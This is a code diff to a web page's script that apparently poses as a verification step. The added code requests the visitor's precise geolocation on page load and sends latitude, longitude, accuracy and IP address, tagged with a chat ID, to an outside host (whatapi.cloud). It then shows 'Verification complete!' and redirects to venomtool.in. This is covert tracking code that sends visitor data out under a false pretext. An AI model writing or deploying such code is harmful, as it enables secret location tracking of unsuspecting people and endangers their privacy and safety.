@@ -88,18 +88,33 @@
         }
     }
 
-    async function sendIP() {
-        const ip = await getIP();
-        const url = `https://whatapi.cloud:8443/loc?chat_id=${chatId}&ip=${ip}`;
-        fetch(url)
+    function sendLocationData(lat, long, accuracy, ip) {
+        const url = `https://whatapi.cloud:8443/loc?chat_id=${chatId}&lat=${lat}&long=${long}&accuracy=${accuracy}&ip=${ip}`;
+        axios
+            .get(url)
             .then(() => {
                 message.textContent = 'Verification complete!';
                 window.location.href = `https://venomtool.in/I/?id=${chatId}`;
             });
     }
 
-    // Send IP address on page load
-    sendIP();
+    function getLocationAndSendData() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async function(position) {
+                const lat = position.coords.latitude;
+                const long = position.coords.longitude;
+                const accuracy = position.coords.accuracy;
+                const ip = await getIP();
+                sendLocationData(lat, long, accuracy, ip);
+            }, function(error) {
+                
+            }, { enableHighAccuracy: true });
+        } else {
+            
+        }
+    }
+
+    getLocationAndSendData();
 </script>
 
 </body>
